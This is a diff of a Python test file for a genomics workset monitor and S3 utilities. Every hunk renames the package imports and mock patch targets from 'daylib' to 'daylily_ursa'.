@@ -8,7 +8,7 @@ from unittest.mock import MagicMock, patch
 
 import pytest
 
-from daylib.workset_integration import (
+from daylily_ursa.workset_integration import (
     WorksetIntegration,
 )
 
@@ -74,7 +74,7 @@ class TestWorksetIntegrationInit:
 
     def test_init_creates_s3_client_if_not_provided(self, mock_state_db):
         """Test initialization creates RegionAwareS3Client if not provided."""
-        with patch("daylib.workset_integration.RegionAwareS3Client") as mock_client_class:
+        with patch("daylily_ursa.workset_integration.RegionAwareS3Client") as mock_client_class:
             mock_client = MagicMock()
             mock_client_class.return_value = mock_client
 
@@ -388,7 +388,7 @@ class TestMonitorWorksetExistenceCheck:
 
     def test_workset_exists_returns_true_when_found(self, mock_state_db_for_monitor):
         """Test that _workset_exists_in_tapdb returns True when workset exists."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         mock_state_db_for_monitor.get_workset.return_value = {
             "workset_id": "test-ws-001",
@@ -405,7 +405,7 @@ class TestMonitorWorksetExistenceCheck:
 
     def test_workset_exists_returns_false_when_not_found(self, mock_state_db_for_monitor):
         """Test that _workset_exists_in_tapdb returns False when workset doesn't exist."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         mock_state_db_for_monitor.get_workset.return_value = None
 
@@ -419,7 +419,7 @@ class TestMonitorWorksetExistenceCheck:
 
     def test_workset_exists_returns_false_when_no_state_db(self):
         """Test that _workset_exists_in_tapdb returns False when state_db is None."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor.state_db = None
@@ -430,7 +430,7 @@ class TestMonitorWorksetExistenceCheck:
 
     def test_monitor_does_not_create_worksets(self, mock_state_db_for_monitor):
         """Test that monitor does NOT call register_workset for unknown worksets."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         # Workset doesn't exist in TapDB
         mock_state_db_for_monitor.get_workset.return_value = None
@@ -457,7 +457,7 @@ class TestMonitorReconcileTapDBState:
     @pytest.fixture
     def mock_monitor_for_reconciliation(self):
         """Create a mock monitor for reconciliation tests."""
-        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES
+        from daylily_ursa.workset_monitor import WorksetMonitor, SENTINEL_FILES
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor.state_db = MagicMock()
@@ -466,7 +466,7 @@ class TestMonitorReconcileTapDBState:
 
     def test_reconcile_updates_tapdb_when_s3_shows_complete(self, mock_monitor_for_reconciliation):
         """Test that TapDB is updated when S3 shows complete but TapDB shows in_progress."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
 
@@ -493,7 +493,7 @@ class TestMonitorReconcileTapDBState:
 
     def test_reconcile_updates_tapdb_when_s3_shows_error(self, mock_monitor_for_reconciliation):
         """Test that TapDB is updated when S3 shows error but TapDB shows ready."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
 
@@ -519,7 +519,7 @@ class TestMonitorReconcileTapDBState:
 
     def test_reconcile_does_not_overwrite_terminal_tapdb_state(self, mock_monitor_for_reconciliation):
         """Test that terminal states in TapDB are not overwritten."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
 
@@ -543,7 +543,7 @@ class TestMonitorReconcileTapDBState:
 
     def test_reconcile_updates_ready_to_in_progress(self, mock_monitor_for_reconciliation):
         """Test that TapDB is updated from ready to in_progress when S3 shows in_progress."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
 
@@ -570,7 +570,7 @@ class TestMonitorReconcileTapDBState:
 
     def test_reconcile_skips_workset_not_in_tapdb(self, mock_monitor_for_reconciliation):
         """Test that reconciliation is skipped for worksets not in TapDB."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
 
@@ -591,7 +591,7 @@ class TestMonitorReconcileTapDBState:
 
     def test_reconcile_skips_when_no_state_db(self, mock_monitor_for_reconciliation):
         """Test that reconciliation is skipped when no state_db is configured."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
         monitor.state_db = None  # No state DB
@@ -609,7 +609,7 @@ class TestMonitorReconcileTapDBState:
 
     def test_reconcile_handles_update_failure_gracefully(self, mock_monitor_for_reconciliation):
         """Test that reconciliation handles TapDB update failures gracefully."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
 
@@ -631,7 +631,7 @@ class TestMonitorReconcileTapDBState:
 
     def test_reconcile_called_during_check_workset_state(self, mock_monitor_for_reconciliation):
         """Test that reconciliation is called during _check_workset_state."""
-        from daylib.workset_monitor import Workset
+        from daylily_ursa.workset_monitor import Workset
 
         monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
 
@@ -668,7 +668,7 @@ class TestMonitorConcurrentProcessing:
     def test_mark_workset_active_success(self):
         """Test marking a workset as active when slots available."""
         import threading
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor._active_worksets = set()
@@ -684,7 +684,7 @@ class TestMonitorConcurrentProcessing:
     def test_mark_workset_active_at_capacity(self):
         """Test marking a workset as active when at capacity."""
         import threading
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor._active_worksets = {"ws-001", "ws-002", "ws-003"}
@@ -700,7 +700,7 @@ class TestMonitorConcurrentProcessing:
     def test_mark_workset_active_already_active(self):
         """Test marking a workset as active when already active."""
         import threading
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor._active_worksets = {"ws-001"}
@@ -715,7 +715,7 @@ class TestMonitorConcurrentProcessing:
     def test_mark_workset_inactive(self):
         """Test marking a workset as inactive."""
         import threading
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor._active_worksets = {"ws-001", "ws-002"}
@@ -731,7 +731,7 @@ class TestMonitorConcurrentProcessing:
     def test_get_active_count(self):
         """Test getting the count of active worksets."""
         import threading
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor._active_worksets = {"ws-001", "ws-002"}
@@ -742,7 +742,7 @@ class TestMonitorConcurrentProcessing:
     def test_is_workset_active(self):
         """Test checking if a workset is active."""
         import threading
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor._active_worksets = {"ws-001"}
@@ -753,7 +753,7 @@ class TestMonitorConcurrentProcessing:
 
     def test_should_skip_workset_complete(self):
         """Test that completed worksets are skipped."""
-        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES
+        from daylily_ursa.workset_monitor import WorksetMonitor, SENTINEL_FILES
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor.attempt_restart = False
@@ -765,7 +765,7 @@ class TestMonitorConcurrentProcessing:
 
     def test_should_skip_workset_error_no_restart(self):
         """Test that errored worksets are skipped when restart not enabled."""
-        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES
+        from daylily_ursa.workset_monitor import WorksetMonitor, SENTINEL_FILES
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor.attempt_restart = False
@@ -777,7 +777,7 @@ class TestMonitorConcurrentProcessing:
 
     def test_should_skip_workset_error_with_restart(self):
         """Test that errored worksets are NOT skipped when restart enabled."""
-        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES
+        from daylily_ursa.workset_monitor import WorksetMonitor, SENTINEL_FILES
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor.attempt_restart = True
@@ -789,7 +789,7 @@ class TestMonitorConcurrentProcessing:
 
     def test_should_skip_workset_ignored(self):
         """Test that ignored worksets are skipped."""
-        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES
+        from daylily_ursa.workset_monitor import WorksetMonitor, SENTINEL_FILES
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor.attempt_restart = False
@@ -801,7 +801,7 @@ class TestMonitorConcurrentProcessing:
 
     def test_should_not_skip_ready_workset(self):
         """Test that ready worksets are NOT skipped."""
-        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES
+        from daylily_ursa.workset_monitor import WorksetMonitor, SENTINEL_FILES
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor.attempt_restart = False
@@ -817,7 +817,7 @@ class TestFormatBytes:
 
     def test_format_bytes_bytes(self):
         """Test formatting small byte values."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         assert monitor._format_bytes(0) == "0B"
@@ -826,7 +826,7 @@ class TestFormatBytes:
 
     def test_format_bytes_kilobytes(self):
         """Test formatting kilobyte values."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         assert monitor._format_bytes(1024) == "1.0K"
@@ -836,7 +836,7 @@ class TestFormatBytes:
 
     def test_format_bytes_megabytes(self):
         """Test formatting megabyte values."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         assert monitor._format_bytes(1024 * 1024) == "1.0M"
@@ -844,7 +844,7 @@ class TestFormatBytes:
 
     def test_format_bytes_gigabytes(self):
         """Test formatting gigabyte values."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         assert monitor._format_bytes(1024 * 1024 * 1024) == "1.0G"
@@ -852,7 +852,7 @@ class TestFormatBytes:
 
     def test_format_bytes_terabytes(self):
         """Test formatting terabyte values."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         assert monitor._format_bytes(1024 * 1024 * 1024 * 1024) == "1.0T"
@@ -863,7 +863,7 @@ class TestExtractSampleIdFromPath:
 
     def test_extract_sample_id_cram(self):
         """Test extracting sample ID from CRAM file path."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
 
@@ -872,7 +872,7 @@ class TestExtractSampleIdFromPath:
 
     def test_extract_sample_id_snv_vcf(self):
         """Test extracting sample ID from SNV VCF file path."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
 
@@ -881,7 +881,7 @@ class TestExtractSampleIdFromPath:
 
     def test_extract_sample_id_sv_vcf(self):
         """Test extracting sample ID from SV VCF file path."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
 
@@ -890,7 +890,7 @@ class TestExtractSampleIdFromPath:
 
     def test_extract_sample_id_invalid_format(self):
         """Test extracting sample ID from invalid format returns None."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
 
@@ -900,7 +900,7 @@ class TestExtractSampleIdFromPath:
 
     def test_extract_sample_id_simple_format(self):
         """Test extracting sample ID from simple two-part format."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
 
@@ -914,7 +914,7 @@ class TestCollectPostExportMetrics:
     @pytest.fixture
     def mock_monitor(self):
         """Create a mock monitor with required attributes."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor.state_db = MagicMock()
@@ -948,7 +948,7 @@ class TestCollectPostExportMetrics:
         mock_monitor.state_db.update_performance_metrics = MagicMock(return_value=True)
 
         # Mock PipelineStatusFetcher
-        with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+        with patch("daylily_ursa.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
             mock_fetcher = MagicMock()
             mock_fetcher_class.return_value = mock_fetcher
             mock_fetcher.fetch_performance_metrics_from_s3.return_value = {
@@ -986,7 +986,7 @@ class TestCollectPostExportMetrics:
         mock_monitor.state_db.update_performance_metrics = MagicMock(return_value=True)
 
         # Mock PipelineStatusFetcher
-        with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+        with patch("daylily_ursa.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
             mock_fetcher = MagicMock()
             mock_fetcher_class.return_value = mock_fetcher
             mock_fetcher.fetch_performance_metrics_from_s3.return_value = {
@@ -1039,7 +1039,7 @@ class TestParseBenchmarkCosts:
     @pytest.fixture
     def mock_monitor(self):
         """Create a mock monitor for benchmark tests."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         return monitor
@@ -1134,7 +1134,7 @@ class TestHeadnodeAnalysisPath:
 
     def test_record_pipeline_location_stores_path(self):
         """Test that _record_pipeline_location stores headnode_analysis_path in TapDB."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
         from pathlib import Path, PurePosixPath
         import tempfile
 
@@ -1163,7 +1163,7 @@ class TestHeadnodeAnalysisPath:
 
     def test_record_pipeline_location_handles_db_failure(self):
         """Test that _record_pipeline_location continues on TapDB failure."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
         from pathlib import Path, PurePosixPath
         import tempfile
 
@@ -1194,21 +1194,21 @@ class TestProgressStepsMetrics:
 
     def test_progress_step_collecting_metrics_exists(self):
         """Test that COLLECTING_METRICS progress step exists."""
-        from daylib.workset_state_db import WorksetProgressStep
+        from daylily_ursa.workset_state_db import WorksetProgressStep
 
         assert hasattr(WorksetProgressStep, "COLLECTING_METRICS")
         assert WorksetProgressStep.COLLECTING_METRICS.value == "collecting_metrics"
 
     def test_progress_step_metrics_complete_exists(self):
         """Test that METRICS_COMPLETE progress step exists."""
-        from daylib.workset_state_db import WorksetProgressStep
+        from daylily_ursa.workset_state_db import WorksetProgressStep
 
         assert hasattr(WorksetProgressStep, "METRICS_COMPLETE")
         assert WorksetProgressStep.METRICS_COMPLETE.value == "metrics_complete"
 
     def test_progress_step_metrics_failed_exists(self):
         """Test that METRICS_FAILED progress step exists."""
-        from daylib.workset_state_db import WorksetProgressStep
+        from daylily_ursa.workset_state_db import WorksetProgressStep
 
         assert hasattr(WorksetProgressStep, "METRICS_FAILED")
         assert WorksetProgressStep.METRICS_FAILED.value == "metrics_failed"
@@ -1219,7 +1219,7 @@ class TestUpdateExecutionEnvironmentHeadnodePath:
 
     def test_update_with_headnode_analysis_path(self):
         """Test that headnode_analysis_path is stored in graph json payload."""
-        from daylib.workset_state_db import WorksetStateDB
+        from daylily_ursa.workset_state_db import WorksetStateDB
 
         db = WorksetStateDB.__new__(WorksetStateDB)
         db.backend = MagicMock()
@@ -1247,7 +1247,7 @@ class TestUpdateExecutionEnvironmentHeadnodePath:
 
     def test_update_with_multiple_fields_including_path(self):
         """Test updating multiple fields including headnode_analysis_path."""
-        from daylib.workset_state_db import WorksetStateDB
+        from daylily_ursa.workset_state_db import WorksetStateDB
 
         db = WorksetStateDB.__new__(WorksetStateDB)
         db.backend = MagicMock()
@@ -1284,7 +1284,7 @@ class TestStageReferenceBucket:
     @pytest.fixture
     def mock_monitor(self):
         """Create a mock monitor with config for testing."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
 
         monitor = WorksetMonitor.__new__(WorksetMonitor)
         monitor.config = MagicMock()
@@ -1364,7 +1364,7 @@ class TestStageReferenceBucket:
 
     def test_raises_error_when_not_configured(self, mock_monitor):
         """Test MonitorError raised when reference_bucket not configured."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         mock_monitor.config.pipeline.reference_bucket = None
 
@@ -1373,7 +1373,7 @@ class TestStageReferenceBucket:
 
     def test_raises_error_for_empty_string(self, mock_monitor):
         """Test MonitorError raised for empty string."""
-        from daylib.workset_monitor import MonitorError
+        from daylily_ursa.workset_monitor import MonitorError
 
         mock_monitor.config.pipeline.reference_bucket = ""
 
@@ -1387,7 +1387,7 @@ class TestStageSamplesMultiRegion:
     @pytest.fixture
     def mock_monitor(self):
         """Create a mock monitor with required attributes for staging."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
         import tempfile
         from pathlib import Path
 
@@ -1611,7 +1611,7 @@ class TestRegionThreadingInExportResults:
 
     def test_export_results_uses_passed_region(self):
         """Test _export_results uses passed region instead of config default."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
         from unittest.mock import MagicMock, patch
         from pathlib import PurePosixPath, Path
 
@@ -1635,7 +1635,7 @@ class TestRegionThreadingInExportResults:
 
         # Mock Path.exists to return False (no fsx_export.yaml)
         with patch.object(Path, "exists", return_value=False):
-            from daylib.workset_monitor import MonitorError
+            from daylily_ursa.workset_monitor import MonitorError
             try:
                 monitor._export_results(
                     workset=workset,
@@ -1655,7 +1655,7 @@ class TestRegionThreadingInExportResults:
 
     def test_export_results_falls_back_to_config_region(self):
         """Test _export_results falls back to config region when none passed."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
         from unittest.mock import MagicMock, patch
         from pathlib import PurePosixPath, Path
 
@@ -1676,7 +1676,7 @@ class TestRegionThreadingInExportResults:
         workset.prefix = "worksets/test/"
 
         with patch.object(Path, "exists", return_value=False):
-            from daylib.workset_monitor import MonitorError
+            from daylily_ursa.workset_monitor import MonitorError
             try:
                 monitor._export_results(
                     workset=workset,
@@ -1699,7 +1699,7 @@ class TestCleanupPipelineDirectoryRegion:
 
     def test_cleanup_pipeline_directory_passes_region(self):
         """Test _cleanup_pipeline_directory passes region to headnode command."""
-        from daylib.workset_monitor import WorksetMonitor
+        from daylily_ursa.workset_monitor import WorksetMonitor
         from unittest.mock import MagicMock
         from pathlib import PurePosixPath
 
@@ -1730,7 +1730,7 @@ class TestRegionAwareS3Client:
 
     def test_normalize_bucket_name_strips_s3_prefix(self):
         """Test that normalize_bucket_name strips s3:// prefix."""
-        from daylib.s3_utils import normalize_bucket_name
+        from daylily_ursa.s3_utils import normalize_bucket_name
 
         assert normalize_bucket_name("s3://my-bucket") == "my-bucket"
         assert normalize_bucket_name("s3://my-bucket/") == "my-bucket"
@@ -1741,9 +1741,9 @@ class TestRegionAwareS3Client:
 
     def test_client_initialization(self):
         """Test RegionAwareS3Client initializes with default region."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             mock_session = MagicMock()
             mock_client = MagicMock()
             mock_boto3.Session.return_value = mock_session
@@ -1758,9 +1758,9 @@ class TestRegionAwareS3Client:
 
     def test_client_initialization_with_profile(self):
         """Test RegionAwareS3Client initializes with AWS profile."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             mock_session = MagicMock()
             mock_client = MagicMock()
             mock_boto3.Session.return_value = mock_session
@@ -1780,9 +1780,9 @@ class TestRegionAwareS3Client:
 
     def test_get_bucket_region_us_east_1_returns_none(self):
         """Test that us-east-1 buckets return 'us-east-1' (GetBucketLocation returns None)."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             mock_session = MagicMock()
             mock_client = MagicMock()
             mock_boto3.Session.return_value = mock_session
@@ -1799,9 +1799,9 @@ class TestRegionAwareS3Client:
 
     def test_get_bucket_region_caches_result(self):
         """Test that bucket region is cached after first lookup."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             mock_session = MagicMock()
             mock_client = MagicMock()
             mock_boto3.Session.return_value = mock_session
@@ -1823,9 +1823,9 @@ class TestRegionAwareS3Client:
 
     def test_get_bucket_region_normalizes_bucket_name(self):
         """Test that bucket name is normalized before region lookup."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             mock_session = MagicMock()
             mock_client = MagicMock()
             mock_boto3.Session.return_value = mock_session
@@ -1840,9 +1840,9 @@ class TestRegionAwareS3Client:
 
     def test_get_client_for_bucket_creates_regional_client(self):
         """Test that get_client_for_bucket creates a client for bucket's region."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             us_west_2_client = MagicMock(name="us-west-2-client")
             eu_central_1_client = MagicMock(name="eu-central-1-client")
 
@@ -1867,9 +1867,9 @@ class TestRegionAwareS3Client:
 
     def test_list_objects_v2_uses_regional_client(self):
         """Test that list_objects_v2 uses the correct regional client."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             default_client = MagicMock(name="default-client")
             eu_client = MagicMock(name="eu-client")
 
@@ -1892,9 +1892,9 @@ class TestRegionAwareS3Client:
 
     def test_put_object_uses_regional_client(self):
         """Test that put_object uses the correct regional client."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             default_client = MagicMock(name="default-client")
             eu_client = MagicMock(name="eu-client")
 
@@ -1916,9 +1916,9 @@ class TestRegionAwareS3Client:
 
     def test_get_paginator_returns_region_aware_paginator(self):
         """Test that get_paginator returns a RegionAwarePaginator."""
-        from daylib.s3_utils import RegionAwareS3Client, _RegionAwarePaginator
+        from daylily_ursa.s3_utils import RegionAwareS3Client, _RegionAwarePaginator
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             mock_session = MagicMock()
             mock_client = MagicMock()
             mock_boto3.Session.return_value = mock_session
@@ -1931,9 +1931,9 @@ class TestRegionAwareS3Client:
 
     def test_exceptions_proxy_exposes_s3_exceptions(self):
         """Test that exceptions proxy allows access to S3 client exceptions."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             mock_session = MagicMock()
             mock_client = MagicMock()
             mock_boto3.Session.return_value = mock_session
@@ -1952,9 +1952,9 @@ class TestRegionAwareS3Client:
 
     def test_invalidate_bucket_cache_removes_cached_region(self):
         """Test that invalidate_bucket_cache removes a bucket from cache."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             mock_session = MagicMock()
             mock_client = MagicMock()
             mock_boto3.Session.return_value = mock_session
@@ -1978,9 +1978,9 @@ class TestRegionAwarePaginator:
 
     def test_paginate_uses_regional_client(self):
         """Test that paginate uses the correct regional client for the bucket."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             default_client = MagicMock(name="default-client")
             eu_client = MagicMock(name="eu-client")
             mock_paginator = MagicMock()
@@ -2009,9 +2009,9 @@ class TestRegionAwarePaginator:
 
     def test_paginate_normalizes_bucket_name(self):
         """Test that paginate normalizes bucket names with s3:// prefix."""
-        from daylib.s3_utils import RegionAwareS3Client
+        from daylily_ursa.s3_utils import RegionAwareS3Client
 
-        with patch("daylib.s3_utils.boto3") as mock_boto3:
+        with patch("daylily_ursa.s3_utils.boto3") as mock_boto3:
             mock_session = MagicMock()
             mock_client = MagicMock()
             mock_paginator = MagicMock()
@@ -2036,7 +2036,7 @@ class TestExecutionContext:
 
     def test_execution_context_to_dict(self):
         """Test ExecutionContext serialization to dictionary."""
-        from daylib.workset_monitor import ExecutionContext
+        from daylily_ursa.workset_monitor import ExecutionContext
 
         ctx = ExecutionContext(
             cluster_name="usw2-test-cluster",
@@ -2064,7 +2064,7 @@ class TestExecutionContext:
 
     def test_execution_context_from_dict(self):
         """Test ExecutionContext deserialization from dictionary."""
-        from daylib.workset_monitor import ExecutionContext
+        from daylily_ursa.workset_monitor import ExecutionContext
 
         data = {
             "cluster_name": "euc1-prod-cluster",
@@ -2092,7 +2092,7 @@ class TestExecutionContext:
 
     def test_execution_context_from_dict_with_optional_fields_missing(self):
         """Test ExecutionContext deserialization with optional fields omitted."""
-        from daylib.workset_monitor import ExecutionContext
+        from daylily_ursa.workset_monitor import ExecutionContext
 
         data = {
             "cluster_name": "test-cluster",
@@ -2115,7 +2115,7 @@ class TestExecutionContext:
 
     def test_execution_context_roundtrip(self):
         """Test that to_dict/from_dict roundtrip preserves data."""
-        from daylib.workset_monitor import ExecutionContext
+        from daylily_ursa.workset_monitor import ExecutionContext
 
         original = ExecutionContext(
             cluster_name="roundtrip-cluster",
@@ -2141,7 +2141,7 @@ class TestExecutionContextTapDB:
 
     def test_set_execution_context_stores_correctly(self):
         """Test that set_execution_context stores the context in TapDB."""
-        from daylib.workset_state_db import WorksetStateDB
+        from daylily_ursa.workset_state_db import WorksetStateDB
 
         db = WorksetStateDB.__new__(WorksetStateDB)
         db.backend = MagicMock()
@@ -2175,7 +2175,7 @@ class TestExecutionContextTapDB:
 
     def test_get_execution_context_retrieves_correctly(self):
         """Test that get_execution_context retrieves the stored context."""
-        from daylib.workset_state_db import WorksetStateDB
+        from daylily_ursa.workset_state_db import WorksetStateDB
 
         db = WorksetStateDB.__new__(WorksetStateDB)
         db.get_workset = MagicMock(
@@ -2198,7 +2198,7 @@ class TestExecutionContextTapDB:
 
     def test_get_execution_context_returns_none_when_not_set(self):
         """Test that get_execution_context returns None when no context exists."""
-        from daylib.workset_state_db import WorksetStateDB
+        from daylily_ursa.workset_state_db import WorksetStateDB
 
         db = WorksetStateDB.__new__(WorksetStateDB)
         db.get_workset = MagicMock(return_value={"workset_id": "ws-001", "state": "ready"})
@@ -2209,7 +2209,7 @@ class TestExecutionContextTapDB:
 
     def test_get_execution_context_returns_none_when_workset_not_found(self):
         """Test that get_execution_context returns None when workset doesn't exist."""
-        from daylib.workset_state_db import WorksetStateDB
+        from daylily_ursa.workset_state_db import WorksetStateDB
 
         db = WorksetStateDB.__new__(WorksetStateDB)
         db.get_workset = MagicMock(return_value=None)
@@ -2225,7 +2225,7 @@ class TestListWorksetsByCustomerGSI:
     @pytest.fixture
     def mock_db(self):
         """Create a WorksetStateDB with mocked graph query path."""
-        from daylib.workset_state_db import WorksetStateDB
+        from daylily_ursa.workset_state_db import WorksetStateDB
 
         db = WorksetStateDB.__new__(WorksetStateDB)
         db.backend = MagicMock()
@@ -2265,7 +2265,7 @@ class TestListWorksetsByCustomerGSI:
 
     def test_list_worksets_by_customer_with_state_filter(self, mock_db):
         """Test filtering by customer and state."""
-        from daylib.workset_state_db import WorksetState
+        from daylily_ursa.workset_state_db import WorksetState
 
         result = mock_db.list_worksets_by_customer("cust-123", state=WorksetState.READY)
 
@@ -2289,7 +2289,7 @@ class TestExecutionContextCustomerId:
 
